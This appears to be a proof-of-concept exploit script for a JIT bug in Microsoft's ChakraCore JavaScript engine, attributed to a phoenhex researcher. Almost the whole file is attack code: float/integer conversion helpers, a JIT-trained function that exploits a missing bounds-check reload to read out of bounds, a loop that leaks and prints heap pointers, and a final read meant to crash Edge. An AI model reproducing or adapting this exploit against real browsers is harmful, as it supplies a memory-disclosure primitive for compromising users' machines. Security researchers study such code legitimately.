// OOB read leak by bkth from phoenhex for ChakraCore, this will crash reading oob in edge
var convert = new ArrayBuffer(0x100);
var u32 = new Uint32Array(convert);
var f64 = new Float64Array(convert);

var scratch = new ArrayBuffer(0x100000);
var scratch_u8 = new Uint8Array(scratch);
var scratch_u32 = new Uint32Array(scratch);
var BASE = 0x100000000;

var shellcode = null;

function hex(x) {
    return `0x${x.toString(16)}`
}

function bytes_to_u64(bytes) {
    return (bytes[0]+bytes[1]*0x100+bytes[2]*0x10000+bytes[3]*0x1000000
        +bytes[4]*0x100000000+bytes[5]*0x10000000000);
}

function i2f(x) {
    u32[0] = x % BASE;
    u32[1] = (x - (x % BASE)) / BASE;
    return f64[0];
}

function f2i(x) {
    f64[0] = x;
    return u32[0] + BASE * u32[1];
}

function valid_pointer(x) {
    f64[0] = x;
    if (u32[1] > 0 && u32[1] < 0x1000) {
        return true;
    }
    return false
}

function opt(o, j) {
    var a = new Float64Array(0x111112);
    o = a;
    o[0] = 1337; 
    var b = a.slice(0,20); 
    b[92] = 13; 
    for (var i = 0; i < a.length; ++i) {
        b = a;
        b[1] = 0x4141;
    }
    // Chakra failed to insert value compensation which cause the headSegmentLength sym to be reloaded
    // but not the headSegment sym, we therefore accessed the new buffer with the wrong length checked
    return b[j];  
}

function pwn() {
    for (var i = 0; i < 300; i++) {
        opt(24, 0x10);
    }

    for (var i = 0x10; i < 0x1000; ++i) {
        let res = opt(24, i);
        if (res != 0 && valid_pointer(res)) {
            val = f2i(res);
            print("Leaked at " + i + ": " + hex(val));
        }
    }
    opt(24, 0x111111); // OOB
}
pwn();
